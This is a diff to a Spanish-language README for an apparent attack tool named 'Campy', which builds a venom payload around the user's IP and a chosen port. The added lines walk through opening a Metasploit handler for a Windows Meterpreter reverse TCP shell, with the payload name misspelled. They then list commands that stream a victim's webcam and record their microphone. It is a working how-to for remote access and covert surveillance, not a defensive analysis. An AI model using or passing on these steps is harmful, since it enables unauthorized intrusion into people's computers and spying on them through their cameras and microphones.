@@ -54,7 +54,7 @@ _Instalamos los requerimientos_
 sudo pip install pyautogui
 ```
 ```
-sudo python3 pack_campy.py
+sudo python3 campy.py
 ```
 
 ## Ejecutando las pruebas ⚙️
@@ -62,6 +62,43 @@ sudo python3 pack_campy.py
 _Campy utilizara socket para tener tu ip y agregarla al codigo de venom, luego te solicitaara un puerto el cual por defecto puedes poner 4444 y por ultimo un nombre para el paquete_
 
 ![Sin-título-1](https://user-images.githubusercontent.com/107135484/191758074-5ffde2c3-1dfe-4d12-9c47-144e20d5065f.png)
+
+_Para poder monitorear:_
+
+```
+use exploit/multi/handler
+```
+```
+set payload windows/meterpreter/reverser_tcp
+```
+_Es muy importante que coloques la misma ip y puertos_
+```
+set LHOST "TU DIRECCION IP"
+```
+```
+set LPORT "EL PUERTO QUE ELEGISTE"
+```
+```
+show options
+```
+```
+exploit
+```
+## Monitorear camara 📸
+
+_Primero enlistamos las camaras_
+```
+webcam_list
+```
+```
+webcam_stream "ELIGE UN NUMERO DE LA LISTA"
+```
+
+## Monitorear mricofono 🎤
+
+```
+record_mic -d "segundos"
+```
 
 ## Construido con 🛠️
 
